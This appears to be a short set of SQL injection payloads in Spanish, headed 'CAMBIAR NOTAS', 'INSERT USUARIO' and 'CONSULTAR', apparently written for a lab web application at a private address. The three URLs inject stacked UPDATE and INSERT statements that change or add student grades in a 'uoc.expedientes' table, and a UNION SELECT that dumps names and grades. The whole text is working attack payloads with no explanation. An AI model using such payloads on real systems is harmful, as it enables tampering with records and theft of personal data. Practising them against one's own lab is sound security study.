-- CAMBIAR NOTAS

http://192.168.109.31/departamento.php?departamento=1; UPDATE uoc.expedientes SET nota = '013' WHERE nombre IN ('luis', 'pablo', 'JESUS CRISTO', 'julian', 'Muerto', 'a casa da collona')--


-- INSERT USUARIO

http://192.168.109.31/departamento.php?departamento=1; INSERT INTO uoc.expedientes (nombre, nota) VALUES ('RESTAURANTE_TEIS', '013'), ('ZOO_TEIS', '013'), ('HACKERS_TEIS', '013')--



-- CONSULTAR

http://192.168.109.31/departamento.php?departamento=1 UNION SELECT CONCAT(nombre, ':', nota) FROM uoc.expedientes